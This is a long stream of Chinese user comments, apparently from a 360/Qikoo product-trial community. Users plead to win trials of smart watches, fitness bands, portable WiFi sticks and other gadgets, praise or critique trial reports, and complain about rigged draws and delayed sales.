大家一起玩穿戴，健康每一台 喜欢玩穿戴的都可以加我QQ 526337692  建立运动联盟
喜欢玩穿戴的加我QQ 526337692
注意到屏幕下方有一块无法显示的吗。这是个硬伤。第一幅图和第二幅图应该是概念设计图来着。
官网上标了USD 390,折合人民币要2500左右了
用户写的很用心，字也很多，请再多上点图片吧~O(∩_∩)O
这表不错               价钱那
价格至硬道理，性价比很高
亲，好用心的用户，写的很认真呢，不过要注意图文结合哦，上面那段长长的文字看了很费力啊，会有些视觉疲劳哦~吧文字中穿插些图片吧~
一定中啊上帝啊求你了
亲，图片太少了，还有注意图文结合哈，在文章总结结合图片进行产品分析，功能分析，剖析注意要点
三星在手表这块真没下功夫 
这个宝呗也拿来试用么
亲，请加些产品图吧，这样只有字显示很单调哦~
看着挺不错，第一次申请希望成功，呵呵
一直很关注这些产品，  希望能有机会尝试
你这叫什么评论？希望小编以后别让他申请成功。
good，可惜我没中。。。
恭喜恭喜！！！！
同感同感。
这个是什么东西啊。没看出来怎么检测健康啊。
求中签，求幸运女神降临，不管结果如何，期待下次试用~~~
太酷了！来一个
太漂亮了！
小心打广告直接封杀你
你的到了么？我的还没有到呢
上帝啊... 我没用过这种东西 哪怕一天，也好 我体验下吧
呵呵，好吧，用过
可是那是杂牌的啊QAQ，并且，只有接电话和看时间两个功能
啥时候能买到啊，再买不到，俺家娃都长大了！
如果可以试用就好啦
写得很赞！！不错的报告
求中！55555555555555555555555555555555555555555555555555555555555555555555555555555555555 
奇酷啥时来个试用吧 哈哈
很期望能得到这样一款智能产品，keep  fit 吧！
真心求中啊~~~~~~~~~~~~~~~~~~~~~~~
每天过来，呼吁一下，坐等问世！
很希望能得到这款产品使用，是我们更加了解自己的身体状况，顶起
都好多期了，从来没感受到得到使用产品的喜悦
最近做了体检，可以作为对比，很期待这一款产品
我现在去的地方全部都是有Wifi的，不管是iShanghai还是CMCC，应该都是能用来定位的，不过感觉还是有漂移
就得个外观，不实用，本人的朋友买过来用，刚开始灭蚊还行，过一段时间后灭蚊效果就比较差了。没有带灯管的好
朋友  我觉得你才是真正的热爱创客！热爱智能家居！  为你精彩的评测较好！ 对了 你加奇酷群没？ 313070236  期待你的加入
真心希望中签啊
何必要手动呢！电能到处有，还是电动的好！
啥时候能买到啊？！
长大了就好，就不用买了！
一直关注着呀，求试用~
什么时候可以买，包邮吗
希望中签！！！！
国内估计得4000
太高端了，买不起
功能不错啊
很早就想过，一直没有厂家做出来
成本控制在200以内才有意义，这个没有什么高成本的零部件
工业设计相当牛
3D的实现方式很有意思
会自己到处爬？通过吸盘能爬上织物面料？不大可能吧
希望能有检测心跳、血压的功能。
嘿嘿 也让我中一次试试吧
连个上市时间表都没有，360要给力点啊。
希望360做的更好，赶紧上市，价格两三百很实在，最好有远程呼叫录音，可以知道小孩周边情况，为何必须蓝牙4.0的手机，这个搞不懂。
这个之前 就有 只是后面有个尾巴  
麻~溜~的，赶紧上市。。。大伙儿嗷嗷等着呢。。。
应该是通过呼吸和心率来监控的
不同意第一段的两个原因，一是外观丑，二是续航短
看着非常的不错啊
呢玛，搞什么基啊360，8岁小孩暑假一个人在家，就等呢！愤慨十分，草
中啊。。。。。。。。。。。。。。。。。。。。
我一天上好几回，求中奖！！！
该公布了吗
非常漂亮，也非常想要。就是不给机会
让我中个奖吧，我正需要这个，我需要知道自己的睡眠质量到底如何，咋么改善
为什么今天还没有公布试用名单哎？？好期待啊
密切关注 验证身高
太拉风了，可惜没钱啊
上万美元、、、 如果有这钱的话还是老实买个家用小轿车好了。这拉风的玩意儿不是咱消费得起的
让我中一次啦
介绍的不详细
求通过~~么么哒~~
试用名单在哪里呢
可怜啊，我又杯具了
n你怎么是精品报告的
艹你妹坑啊没中过一次
真的是随机吗，怎么没中一次
只能说就当买彩票吧。
绝望了 那一篇精品报告我写了那么久 之后就没一次中了
非常不错的手表，光看手表的外形都想买一个  在哪有货啊！！！！
非常喜欢，女生带起来一定好看  什么时候有货呢  买一个送人
最近老婆怀孕了，很期待能给我的生活带来新的体验
东西是不错，但不知道价钱要多少？
360骗人
中一次相当困难哎
写的非常不错，赞一个
没有中过，好几期了，期望可以尝试新鲜的设备
中了，要测试了哦
谢谢鼓励，想法子修改 :)
天啊我是最后一个！！
能别盗图吗？太明显了。
希望可以在优盘上再加上一键录音功能就更完美了
哎。。。。。。 
要出就快出吧
我都预约两回了
软硬件做的很好！
很早以前有一种自行车带有发电的装置，但是没有蓄电池，只是骑起来发电机上面接了个灯泡，能亮而已
求中还不如自己买，我已经购买了。
这是骗人。我已经参加几次都没有中
气气气，不够意思
本来还等抽中这玩玩这个的。算数，去买个三星智能手表玩算了。
等待了七天，等来的却是一场空。。难道这个还要讲究人品？
你真的好幸运。。
我为自己点赞。。。
你参加几次
我没有中，参加几次没中
- -！ 我也觉得是熨斗、、、
我也中了,很幸运,希望能尽快收到.
没人品啊，好伤心！
唉 坑啊 没中
不过我觉得电熨斗外形还是耐看！
天哪   我申请了12期了   经过认真填写申请记录终于中了这个手环！！！！！！！！！！！  12期的失望啊！  才换来这期超值的礼物！   我要好好珍惜啊！
不想再说什么了，只是无语、无语、无语......
试用名单里hurst13_79，不是试用达人——极客奶爸吗？之前明明说试用达人不占普通试用名额，现在居然食言。难怪一次次失败，现在真心失望呢！
从360儿童卫士1就关注，一年多了还不发布，再过上十几年孩子都要娶媳妇了！赶紧的吧！
不仅仅十强光手电 
中国一定要制造出更先进的配件
传统指针式手表造型，设计风格优雅复古，没有一点科技元素。内置传感器可以和其他手环、手表一样记录走路和检测睡眠，支持震动闹钟，5ATM 防水，低功耗蓝牙。
堪称迄今为止最“美貌”的智能手表。
哈哈 好可爱~
又没有我呀。哎。还要坚守！！！！！！凄苦网，你能不能给力一点！
玩的哪一出啊？赶快上市吧~~~ 我从娃一岁多关注到现在，再过一年我觉着东西用处也不大了！
通过蓝牙连接？那走失了怎么连接？能定位到吗？
抱歉，理解错了。只是做记录，不是实时远程定位。
三星在手表这块真下功夫
如果发售了，我一定第一时间购买，与我的想法不谋而合的东东！！
赞一个，好东西很喜欢！
在生活中太实用。。。。。
我想BONG应该增加更多的名额
等了这么久到最后还是一场空
排版搞好点应该会是一篇好文章
很客观的评论！顶一个
5岁的孩子这么厉害？! 
你还卖不卖啊？天天都来看一下，还在公测，直接发售3代吧
很有创意啊 不过最好配上点图哦
这完全是从一个孩子的角度对儿童卫士2的描写啊。赞！！！！！
呵呵，看来这项活动太火爆了，和我一样的朋友还真不少啊。真心希望我们都能有一次机会，而不是部分人重复当幸运儿。
APP已经下完了，就坐等手环上门了哈哈
绝对非常给力的拍照。看完就有了想买的冲动。
望尽早康复~~保重
还是没中，哎
8G容量太小了，应该最起码是16G的！
。。。。  从收藏夹移出。  气哭网永别。 我去淘宝抽免单好了  几率比你高很多，还不用这么费劲填单。  这太过分了  玩弄智商。。 这个产品离表的标准差太多。  买了觉得亏，抽到就是占个便宜。。有个看时间的。算了算了。。。去买我的茄子表了。再见。
什么时候给试用？
我中了！！！！！！！！！！！！
一直关注奇酷，但是第一次申请，如果申请成功了，一定好好说说我的体验感受！
1000RMB用不起
沮丧啊，几率就这么小吗 
东西在哪买啊！？
到底有没有得卖？没得卖就不要蛊惑消费者，好让大家死心，改卖其他产品。
哇，很喜欢啊 
我申请好长时间了 能不能让我中一吧
我想试用啊!!!怎么办！！
这么多功能，完全可以当老公卫士啊。
下载APP完成，嘻嘻~~~
要么你卖我一个，要么给我试用。要么你关门大吉。特么真烦。
为这个有创意的评测点赞   如果在加点图就更棒了
这个很感兴趣，什么时候可以面市。期待中...ing.....
这个很拉风，哪怕是试用一下在还回去，也愿意。很强悍。可是真让买，是不会考虑的了，除了钓鱼，两栖作业几乎没有。
什么时候可以买呀？等！！！！！！！！！！！！    
l我写的太好了，给我自己呱唧呱唧
看来我是第一个啊。写得非常专业啊。可惜传播速度还是蛮了。我用的三星C10卡读取速度可以到60M/S.不过报告确实很好赞一个。
恩，谢谢支持，你也是一个专业的点赞员
等了这么久，也没看到产品发布啊，价格也没有
360的U盘写的很好，但是我没有中
怎么申请啊
怎么申请啊
写的很详细
真酷！我也想有一个
真酷！我也想有一个
真酷！我也想有一个
一直在申请，从未被选中！
非热熔枪设计，是从工业级改为家庭极的转变，不错。
骗子，大骗子 
太奇、太酷——奇酷！！！！！！！！！！！！！！！！！！！
美国进口的灯芯，航空材质，新型的充电方式不是吗？
环保主义的选择.
想申请，比较有代表性，能宣传！不知道可否给我个机会 让我亲身体验下
抢沙发...........
每次提交都提交不上，好不容易填完信息了，不是点按钮没反应就是提示错误，根本就是不让人申请，再也不相信360了
价格..不菲吧
总是不中啊。。。。
能独立打电话吗？？？？？？？？？ 
终于到我了，哈哈哈
这个能试用的话，就更给力了…… 我家就住在海边，家门前就有条河！
价格不贵，一定给我家小子买一台！
唉，还是没抽中啊！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉，唉
这个绝对是神器！
好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好好
这么全新的设计，加上手机的APP链接，我觉得这不仅仅是一款玩具，更是一款***了科技的飞机~价格方面，我估计肯定不菲，但是，忠于对科技产品的钟爱，怎么能不入手？奇酷真是很好的科技迷的天空。
就是嘛 申请要保存地址 咋保存啊 不让申请直接说嘛  太无趣了
保存地址，根本无法保存还怎么申请，忽悠人的。你当我们这边人是傻子啊
价钱不知道，不过众筹网上有低于销售价预订的，我订了一台。http://www.demohour.com/projects/344836
科大讯飞的主要是语音操作功能，这个产品看资料也有语音操作功能。
他们团队有个QQ群号，我加了：257061758
这是他们团队的QQ群号：257061758。我已经加了
他们团队有个企鹅群号：贰伍柒零留意柒伍扒。我已经加了
价格才是王道
竟然没排上精品报告。算了。不跟系统一般计较了。
没方向感啊😱，怎么拐弯(哼哼锯了你)
终于被抽到一次了，耶~一定好好写报告
看来这项活动太火爆了            
相当强悍的车载智能设备，读取车辆信息，实时反馈，还能做到故障检测、安全防护。无愧于行车利器之称。期待实际使用哦！
还能支持多机位拍摄呢，挺专业哦！
这样的设备给人豁然开朗的感觉，可以看到普通民用的3D打印设备大门正在开启。
你还卖不卖啊？天天都来看一下,要么你卖我一个，要么给我试用。
一代等到二代，你还卖不卖呀，KAO
发货没？？？？？？？？？？？？
不错的选择
节省材料费
有助于环境的恶化 支持很不错的东西  
当然是外观.......我挺喜欢的，但还是没买......
每次申请这些商品，都没中，难道我跟这些商品无缘无分吗？难道非提一些建议才能中的还是他们弄虚作假。
还好。。。。
没我伤心啊！
终于中签了，神器啊，我等待你的到来。。。
慢慢来，我跟12期了，也才中
为毛总是不中？？？
看起来很不错啊，性价比确实比较高。赞
好东西，老婆快生比比了，要减肥，真是个好东西，申请一个。
这玩意早就上众筹啦，http://www.zhongchou.cn/deal-show/id-10185。头档388，大家支持下…
这个也可以拿来试用吗？太拉风了。奇酷太牛了
好东西 给我吧
未来趋势啊，好东西
人会每时每刻都带着杯具，唉，又没中。(┯_┯)(┯_┯)(┯_┯)(┯_┯)
哈哈，终于中了一次！
骗人的，中奖名单也就是几行代码的事……
有助于环境的恶化……
这个U盘版非常好，我觉得应该弄个32G版本的，最低也得16G吧
贵啊！买不起，求能便宜点吗
沙发自己先坐，来者是客，可要留下您的宝贵意见哦。
报告已完成
中奖了，好开心！
收到以后我会告诉大家是不是骗人的，不过目前未收到短信，但是网站已经显示“筛选通过”
为什都没中过，郁闷
等得不耐烦了
还是这种表好看些       那些这能都长得........
很用心的写了一个
健身5年了，我可以给你好的建议，申请以完善，写了半小时
果壳路由也有触摸屏，还更好看了 
网站显示已经通过，不过，还没有收到短信，不知道是不是往默认的地址发，还有就是，我更改绑定的手机号了，不会有影响吧？
还有就是，这个真的不是骗人的，只要你用心，总会有一次会抽到你的，祝福大家
就是发热量比较大··密码不能随便改，插在不同的机子上密码就不一样，又要重新设置下手机连接wifi的密码有点麻烦。其他都还好。
没错，地址保存不了
我钟意的类型…一个字&lt;型&gt;
多长时间的试用期啊
人类不断创新发明的杰作
发热太严重啦
像素高点，飞得更久点就好了
我家住在黄土高坡哟………
发热太严重了。
360随身wifi U盘版 有优点同时也有不足之处，还望改进
不过总体性价比超高的 值得推荐
我也想要啊....
工业级改为家庭极的转变，不错。 
奇酷太牛了 
下次就是你了，不要放弃，这个运气成分太多
写了半天，地址保存不了、、、、、
不错，东西不错，写的也很不错！
没有货就不要忽悠了。
哈哈 不错的啊
狗屁像素，真特么低，还只支持iPhone4|4s
是啊。卖不卖，ＣＡＯ
又没通过~~~~~~~~~~~~~~~~~~~~~~~~~~~
什么时候可以买到啊，想给孩子买一个！以后上学就可以稍微放心了
别的什么功能都好，要是能把发热这一项给解决了就完美了。
更期待汽车厂商能做到这点，能够反馈给车主，不过汽车的行车电脑也会在有故障情况下及时亮起报警灯，对于车队管理专门负责的还是比较实用，个人用户个人感觉还是鸡肋，用户不大，能需要的信息行车电脑都能及时反馈了，希望能做到一点更具创新的！
太慢长了！还不开卖！
居然是徐州的 老乡
高德地图更新比百度快多了
一个路由器出问题半年不出来 ，这手表啥时出来啊，如果硬件固定了的话就开卖吧  有BUG可以后期升级  等的黄花菜都凉了   最后，！！！！！！！！！！！！！！！！！！！！！泣血建议把你的360LOGO抹掉，不是写了360就安全了，坏人看到这几个字想想后果，无疑在告诉犯罪分子，你看，我有360护体~~~~~~~~没有LOGO的手表才是真的安全手表
不是的，我之前五期都没抽中，这次中了，筛选通过，不过还没收到短信
用着泡妞，挺好的 
申请好几次了，就是没中过
还卖不卖啊，k。不卖发什么发啊，吸引眼球啊。
超喜欢 希望能有一个 如果对方就是一个普通的手机还能做投影式通话吗？价格不要太贵啊
好大，估计也挺重的，现在出来的话大概很少人有用，现在戴的话夏天很热的。再改进点就更好了 
写了半天 能给个不
靠不靠谱，朋友们都说电子产品申请试用 ，都说是内部人员申请的。一般用户都申请不到。
产品很好 这个申请不了 
老兄....这照片看完之后我眼睛有点迷糊啊- -
其它介绍有么？开箱太简单了 期待楼主后续。。
第一次见到晒开箱只把地址晒出来的。。。还是奇酷家的地址wwww。。
可靠吗！真心期待
是米键抄袭360，有一个无脑小米粉。。。
尼玛。。。天猫上都有卖的了，还搞什么试用？
建议把你的360LOGO抹掉，不是写了360就安全了，坏人看到这几个字想想后果，无疑在告诉犯罪分子，你看，我有360护体~~~~~~~~没有LOGO的手表才是真的安全手表  
应该多点图片 给我们哈
等不及……
忽悠人…………
我知道，申请试用未必有我，可是我依然保持着对“新、奇、炫、酷”的科技产品不曾间断的渴望与追求！加油！
我也写了半天，地址保存不了、、、是嘛回事！
写得很不错哈！！
看着就很不错，要是能中一台就更好了，是吧？？
这明明op Gear21季第2集杰米里克拉克森用的
谢谢夸奖。。。写完之后才发现有更好的测试方法。。。失算了。。。
没收到短信 不过已经收到了………………
这个真心不是骗人的，虽然我12期都没中，但是奇酷网还是满人性化的，还送了一个安慰奖个我----小智键一个，我还是蛮开心的，早就收到了，真的。耐心一点会轮到你的，或许是你申请报告写的不好，耐心一点会有的。
今天无意间点进来看到，世上居然还有这货了，我落伍了，看了半天发现，原来就是一个超级缩小版的主机，随便拿到一个有LED显示器的地方接上线就可以用的超级小体型主机，外观确实够迷你的，差不多一小平板，但是配置真不敢恭维，不过说实话体积那么小配置高了，散热绝对是硬伤，鉴定完毕，山里来的孩子以前没见过，大家不要笑我哦
好亮我要中签
一定给我买一台！ 
但是我相信只要支持一定能够申请成功的。
再不出基本就用不上了！
东西不错，我要 
现在正在用obd，但没这么多功能
再不出基本就用不上了！ 真是
何时上市啊
第一次写评测，希望大家多多包涵
什么时间能买到那个手表呢？
用这个炫富...高科技就是你，你就是高科技......
清晰度如何
欢迎大家对本报告进行批评指教。
写得不错，顶一个！
您好，请问充电接口有没有橡胶防尘塞
地址保存不了，申请无法成功。
希望这个设备比较好用。
这么贵的价格不适合推广
搞毛那么久还不公开销售
很详细，很好，体验的很到位~
靠，偏大家的，根本就保存不了地址，你点保存地址的话他们已经收录了数据，所以大家别上当，这个骗人的，操！！！
太酷了。。。。。。。。。。。。。。
写的很棒！！加油 不错
期待进一步试用体验...
看看，呵呵，看看，呵呵。
我知道，申请试用未必有我，可是我依然保持着对“新、奇、炫、酷”的科技产品不曾间断的渴望与追求！加油！  
点击购买怎么找不开网页？
虽然每一次的申请都不通过，但是我会继续坚持的，肯定会有一次选中
第一次申请没有通过！！！
我的还没到，等着楼主后续更新我好参考参考，嘿嘿！
我只想说几个字 我不想再中了 求求你们了
占个楼。俺的还没到。
图片最好能居多显示效果会更好些~~
谢谢，阿里嘎多
您好！可能是系统服务出了点问题，你可以点击这个链接进入网页http://www.demohour.com/projects/344944
你这个用的是touch吗？是几代？有蓝牙4.0吗？
很全面  赞
发热是用wifi功能的时候还是U盘存储的时候呢？
好羡慕啊。儿子好帅啊。
看了这么多报告。感觉这个产品能大卖。
有新意，有创意。
双机评测，真是有点浪费啊。哈哈。但是写的报告是真的好。赞，。
建议增加一项可以检测周边环境客气质量的并警示的功能。
是环境空气
写完了，刚开始是因为无法上传，群里人告诉我先传个空的在修改。果然有用！工程师啊，加油啊！！！
能预约吗？到底有没有得卖？没得卖就不要蛊惑消费者，好让大家死心，不要搞什么饥饿营销。要是没有，我就买其他牌子的路由器了。
touch5  和苹果5都可以，蓝牙4.0
两者都会 使用U盘存储的时候严重点
支持一下，希望下次我有手环时我也能中。。。羡慕哇！
顶一下吧，少年们
“支持一下”
很有用，等官方等得我好苦，我决定去万能的淘宝弄一个去哈哈哈哈
确实是很有用的建议，大家怎么没人点赞？我帮你点一个！
继续坚持，肯定会有一次选中啊 
哈哈  会的会的
决定去万能的淘宝买一个去哈哈哈哈   报告很赞，简洁明了
很好的报告，简洁明了，值得学习！看来这个酷品很赞，我准备去万能的淘宝弄一个去（不怪我，官方让人等得好捉急，预约八百年还不见动静）
很好的报告，简洁明了，值得学习！看来这个酷品很赞，我准备去万能的淘宝弄一个去（不怪我，官方让人等得好捉急，预约八百年还不见动静）
我想试用啊!!!
感谢奇酷~~么么哒~~ 
★奇酷试用★ ★无限精彩★
看到大家都开始发评测了，到现在我还没有收到
希望试用成功，我会好好写报告的 
大气啊。航拍神器
保持着对“新、奇、炫、酷”的科技产品不曾间断的渴望与追求！
希望试用成功，我会好好写报告的！相信我！
期待产品出炉.~~~ 
官网现在已经可以跳转点击购买了..
再等等哈~我也才刚收到呢~我不打算这么快就交报告呢~~~
好帅啊啊啊
期盼，等待，守望
再接再厉，加油！
不错嗯·~不知道什么时候出来啦
辛辛苦苦做了一个礼拜日啊！奇库360这些足以见我诚意了吧！！！
沙发自己坐···哈哈
抢沙发···
已经收到了 ，等我今天的数据同步到APP上后再写测评。好开兴
好快。。就是这手毛不忍直视。。
这果然是个仇恨贴。
写的很好，你太谦虚了！
求支持啊 各位朋友
写的不赖，用心了。我的还没收到。得等本周末抽时间写了。
太贵了吧  感觉看起来也不是很高端啊
我去 写得好详细 仁兄佩服！！
来一发，球中签
小贵，不过感觉很不错
幸运女神，来吧
想购买，我试用没有申请到，就算没有申请到也想购买，怎么才能购买到有定位系统的这类炫酷手表呢？
是的！有兴趣欢迎进入点名时间了解详情http://www.demohour.com/projects/344944
我看出你来了
一直在等待的我
小刺刺童鞋
谢谢，第一次没经验啊！
互相学习，相互进步！
希望好运快快来！
图拍拍得不错  就是P得太过了
终于找到款有时间显示的运动手环  赞！ 一定要入手
泡妞神器啊！
这个建议靠谱啊！！！
这个靠谱啊！！强烈建议
好宝贝，求便宜 
顶   要顶   必须顶   不得不顶   用尽全力顶   再加上千斤顶   总之把它顶到顶   接着使出葵花宝顶   就算顶到史前也要顶   老子看了会用道德经顶   孔子亲自拜你为师天天顶   秦始皇站在阿房宫上使劲顶   汉高祖挥师杀向东罗马为你顶   吕布抛弃了貂禅而选择了帮你顶   张三丰见了后用太极拳九式全力顶   左冷禅召开武林盟主大会商讨如何顶     
使用！怎么申请？
在哪有卖？
还可以嘛，写的还行。。最后这建议…能实现得了么？要是公共wifi多不安全啊…
?? 亲 你是不是把草稿交上来了。。。。我的还在缓慢写ing。。。。
还在用xp啊
功能上不错  现在这个社会真无奈  具体实测不知道  不过用料看起来确实有点硬伤
支持一下…
写的好详细，支持一下！
谢谢支持~~~
嗯，谢谢啦~
支持一下~
谢谢…感谢支持
写得不错~12岁就有这水平了，佩服
好好喜欢呢
期待新产品。。。
嗯嗯，谢谢支持。不过，比起诸位大神来，我的报告还是不够好的啦。
用料还行，都是无害的材料，可能外形美化做的不太完善，让人看起来有点~~~不过真心不是小摊上那种垃圾小表
第一次写报告..对比了一下别人的还真的是弱爆了..唉..语文差就是这样的
天猫上多的是，买了发现发热很大，慎用哈。
又是饥饿营销
为什么我们填了单子，那次活动也都写好了，却没有手表发给我们呢？我们也很想要一个啊 我们也打了很多字，花费了精力啊，为什么就不给我一个手表呢？ 还有，希望奇酷网要不就让我们这些没体验过的试用一回，要不就赶紧开始卖手表啊~~
希望抽中 亲360
一直在等你的手表，你到底还卖不卖，别跟我扯什么为了更好，世上就没有绝对完美的东西，如果你想做到完美，那就别扯犊子赚眼球
准备批发，来吧告诉我哪里买
谢谢，但我自己感觉还是缺少点什么
这是个好东西
希望我可以成功！
抓奸吗？这TMD才叫回复
期待ing
2个月能量产出来就不错了、现在还是设计PCB
希望这次一定要中，我已经失去太多
呼呼，传了5遍，总算上传成功了，累死了，休息去了，大家有什么问题，可以给我留言，看到，都会恢复的。希望大家多多点赞，多谢了！
一定中一定中一定中......
3D打印机一点多不环保。某些材料不可多次使用。而且非常贵。。不易降解。现在多用于打样，打模
看好这个和iwatch，哪个便宜买哪个
为什么不走平民路线呢804都可以买一部较好的手机了  
手机静音了也会出声音吗
视频很有意思~多来点靓照吧
最后这个亮了  很赞哈哈
图片排版 能不能再多点内容介绍哈
相互学习 http://www.qikoo.com/try/paper?id=53b11832c84a8af0170000a7
图片较少，离竞品报告距离不小呢。。。哈哈
有了360 妈妈再也不用担心我的电脑不安全了
真的很像電熨斗
你真有创意，高~
无论是此款智键，还是360随身Wifi，都是……鸡肋
台灣可以用嗎?
大家都在对一种产品奇思妙想，这算不算创意产业的雏形呢，这种产品生产模式在未来一定大行其道，参与的过程很让人兴奋。
谢谢支持！
谢谢阿姨的夸奖
爸爸的整理挺重要
爸爸帮忙配好图了
图片已经请爸爸帮助加上了
谢谢阿姨的夸奖 TWO
谢谢夸奖，哈哈
包装很酷，无线充电也很时髦。
不知能否中的
明明说今天公布，谁知又推迟
难道举办这次活动有内鬼
目前中国哪里有卖啊！！！跪求
如果不是看了这篇文章，还真不知道这个产品的应用是啥。手册上没说怎么安装应用。如何添加。。。。
看来不止我一个人感觉像是电熨斗
祝宝宝早日康复~
为拆机二字进来的，可介个拆机太水了吧？
本来就像。
VERY GOOD!
不可能抽中的  都是内鬼的
真是无语 就想给儿子上幼儿园的时候用 9月份都要开学了 还没有发售 试用抽奖就没有中过一次 
50个，就不能轮到我一次吗
好东东，喜欢
希望抽中啊
支持，望中
这个太帅了。希望在智能手环领域能有突破。
虽然不相信内鬼一说，不过一直没中过就有点双色球的感觉了
盖子可以插在后面
我最想要的东西，没中。。。
支持，加油，我中，我中！！！！
了解，只不过我是来拿酷币的……
柯南的滑板
 不要灰心 下次有机会的
嗯 只是如果设计成一体的会更方便
终于有款能看时间的运动手环了！
呵呵，很期待你的报告
这个真经典，希望能获得试用的机会啊！
求中奖。。。
求中奖。。。
看起来真心不错，但看了参数，45度以下正常工作，那么，热水沐浴偑带就不可能了。日常防水很有必要。
机率很小。希望好运动能到自己身边，想了解它的饮食和睡眠健康管理方案如何
希望能够中  
写的确实很详细，就是不知道360工程师会不会看。
哈哈，多谢，评论，只是觉得如果图片的话，大家随处都可以看到，想多写些文字。
为什么没人给你点赞？？？我觉得挺好的。
很喜欢，希望能中啊
最后说的有理，强烈点赞！
很喜欢又有新品了！
大前年的工博会就已经有类似的产品出现了只不过那时看到的是用来简单操作特定软件界面的
报告精美，结尾很美
果然是到了 运动季 塑身季啊 
运动季正式开始了么           希望能中一个试用一下啊         
LED不会杀菌
我已经参加两次活动，这次是第三次
运动集必备啊，上次BONG没中这次希望中啊！！！嘻嘻嘻
我都一直在参加活动，一直不中么
这个产品看起来挺赞的，期待
不写了  太难受了  还有好多文字和图片无法发表出来   
手机可以直接查看电脑里面的图片视频等文件可以在手机打开播放，并且支持下载到手机。  在u盘里面安装个360急救盘或老毛桃u盘系统是非常必要的 
有好运气中了吗？
支持一下，顶一个！
写的好幽默！支持一个！
在外观写的很详细，是一篇很好的文章
意见和建议写的很好，赞一个
WiFi密码为什么要打码，我还想去蹭网呐
好东东，喜欢 .不错不错
体验很真实，赞~问下一代和二代区别大么？ 
亲，写的不错但是能不能不要用加粗字体啊看着好晕@_@
小编好犀利。。。说出了我的心声：D
这个看起来不错哦~手表还比较实用~
一直都没中过奖
没货说过求 
手表不错，希望能中
图片拍的很赞
好棒！o(≧v≦)o~
关注好多天了，都是预约结束，不知有没有
申请好多次了，不知这次怎么样？很期待这款产品。
THANKS
thanks
好几期了，没被选中一次，希望这次人品爆发！
希望我下次也能中啊。
赌球不中也就算了，反正也不是第一次了！但这第一次申请，小占下便宜还不给面子么？
赫赫，有人在机器上做了手脚，这次试用必有我！
让我怦然心动！
用过很多种OBD设备，但我的江淮车好像都不行。
何时开卖了？1都没发售就推2了，快点卖吧
这个要多少钱啊？能上牌不？
新产品新艺术新生活，在于“新”“奇”“酷”。
不错啊 希望继续更新 让大家看看你的减肥成果
  哈哈  因为我的WIFI密码是弄的手机号了  蹭网当然是欢迎啦 我们公司几乎都用我这个WIFI
哈哈，必须的！
这个太帅了，想要！
求人品爆发，试用成功。
新产品，新动力，新活力
我这么多期都没有中 我希望奇酷给我中这一次 
我以299元的价格从京东买了这款产品，现在我来说说这款产品的问题。首先，我没有插移动的4G卡，和我的红米手机连接了，显示连接速度只有65M，该产品说明支持802.11 b/g/n，也就是说能达到300M的传输速度，为什么我的红米显示只有65M，是我的手机问题还是你的产品问题，另外我连家里的TP-LINK 842N，显示连接速度能达到135M，请360给予正面解释！！！！
第二期开始每期都参加了，没有中一次，求给我一次机会
你们关注的啥- -，不错，支持你！
什么时候买？
多天 ，没有给我呢 快拿没----
编号卡被替代了，后面还有很多更有意思的纪念品呢
每次都不中，希望这次应该被选中。
楼主好有口才！！
无线充电⊙﹏⊙我喜欢，能中吗…………
啊啊啊，又来手环！！求中签~~~
虽然每次都失败，但我依然信心满满，我坚信总有一次能试用成功的！
多谢多谢！过奖咧！
楼主好生幽默哦！~
关注一段时间了，希望能中！
赞！！！！！！！！！！！！！！
还是要试一试。
谢谢支持！！！
求中一次。
争取这次能中啊，
希望能中！
棒棒哒！超赞！♥
不能直接花钱买吗？
和上一次的智能手环bong很相似，操作简单，防水，电池耐用，生活必不可少的物品之一。希望这一次可以被奇酷选中!
详细介绍了下 哈哈
精品测评就是不一样   很赞哦
智能手环bong  没有申请到，  这个有没有希望呢 
好想拥有一台，如此优质的环保车！期待中！
其实外观差别不是特别大，二代还是要好看些，不过使用功能差了好多，例如一代只能设置一个闹钟，而二代的具体设置上限我没有测试过。而且一代现在已经被官方抛弃了，二代具备的功能应用，一代基本都没有，一代上只有正常的状态记录和一个闹钟。。。。。
好奇心引导者我们去发现事物       
总是不能保存？无法申请。无诚意？最好的创意也白搭。期待入门没坎。
传说中众筹到100W的手环。支持一下。
为什么我预约这么久都没反应啊   什么时候开始有信息？
试过才知道什么是好
奇迹总是这么忽悠人
奇迹总是这么忽悠人
新科技产品收藏复制并申请！！！
赞，就是我想要的，99+
好像比bong好多了外观也比他漂亮，显示屏也比他大太帅了，
手环一次也没有中过，能不能让我中一次，期待
一直没中过，但愿这次不像从前
越快越好出来第一代，然后不断升级，操控性能和稳定性必须好！
当时开筹资的时候没有抢到前面相对便宜的价格，这次希望能抽中啊，特别喜欢这只智能手环！
真是不错的，那位粉红运动女还是很性感的嘛。
积极申请中。
图片拍的很好，赞一个！
我希望能被中签哦
申请了这么久让我中签吧，需要这个啊
太没诚意了，根本就不能保存太可恶了
期待啊 最喜欢这个了
好漂亮~~我的菜啊~~
是保存不了收货地址！
倒计时  ！！！！！！！
我也想申请个
真的不错哦
申请了这么久让我中次吧 
申请了好多次都没中过，希望这次能中签。
真好。。我真得想有一个
有中文吗。我看都是英文
申请多次，每次都没中，纳闷
我真得想有一个
最后这个超赞！O(∩_∩)O哈哈~
这款手环外型好酷哦
申请申请。这么好的产品。
期待中标~
真得想有一个 
积极申请中
这产品要不要这么屌。
看起来超酷！！有b格
中签吧  期待啊
希望得到试用资格 
真想要 求人品
希望能有试用的资格，好像很棒的一样
申请n次了  一次都没试用过
3D打印不环保，打印出来的塑料制品不能2次利用，希望各位创造者能改进一下
估计没多少人有耐心看你报告的结尾，下次建议你换个顺序吧~~毕竟这几个建议确实需要的人很多！
特别喜欢这件产品希望可以试用~~
几乎期期申请，从未中过，但还要坚持下去，说不定下一个就是呢。
